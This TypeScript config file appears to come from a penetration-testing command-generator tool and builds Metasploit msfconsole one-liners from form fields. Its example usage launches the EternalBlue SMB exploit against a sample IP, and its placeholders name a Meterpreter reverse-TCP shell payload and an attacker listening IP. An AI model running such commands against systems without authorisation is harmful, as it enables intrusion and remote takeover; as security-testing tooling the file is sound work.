import type { GeneratorConfig } from '../../types/generator';

export const metasploitGenerator: GeneratorConfig = {
  id: 'metasploit',
  name: 'Metasploit / MSFConsole',
  description: 'Commands to quickly launch modules in Metasploit Framework.',
  categoryId: 'exploitation',
  exampleUsage: 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.5; run"',
  explanation: 'MSFconsole is the primary interface to the Metasploit Framework. Using the -x flag allows executing a string of console commands directly from the terminal.',
  fields: [
    {
      id: 'module',
      label: 'Module Name',
      type: 'text',
      placeholder: 'exploit/windows/smb/ms17_010_eternalblue',
      required: true,
      defaultValue: '',
      description: 'The Metasploit module to use.'
    },
    {
      id: 'rhosts',
      label: 'RHOSTS (Target)',
      type: 'text',
      placeholder: '192.168.1.5',
      required: true,
      defaultValue: '',
      description: 'The target IP or range.'
    },
    {
      id: 'lhost',
      label: 'LHOST (Attacker IP)',
      type: 'text',
      placeholder: '192.168.1.10',
      defaultValue: '',
      description: 'Your listening IP address (if using a reverse payload).'
    },
    {
      id: 'payload',
      label: 'Payload',
      type: 'text',
      placeholder: 'windows/x64/meterpreter/reverse_tcp',
      defaultValue: '',
      description: 'The payload to use.'
    },
    {
      id: 'quiet',
      label: 'Quiet Mode',
      type: 'checkbox',
      defaultValue: true,
      description: 'Do not print the banner on startup (-q).'
    }
  ],
  generateCommand: (values: any) => {
    const parts = ['msfconsole'];
    if (values.quiet) parts.push('-q');
    
    const cmds = [];
    if (values.module) cmds.push(`use ${values.module}`);
    if (values.rhosts) cmds.push(`set RHOSTS ${values.rhosts}`);
    if (values.lhost) cmds.push(`set LHOST ${values.lhost}`);
    if (values.payload) cmds.push(`set PAYLOAD ${values.payload}`);
    cmds.push('run');
    
    if (cmds.length > 0) {
      parts.push(`-x "${cmds.join('; ')}"`);
    }
    
    return parts.join(' ');
  }
};
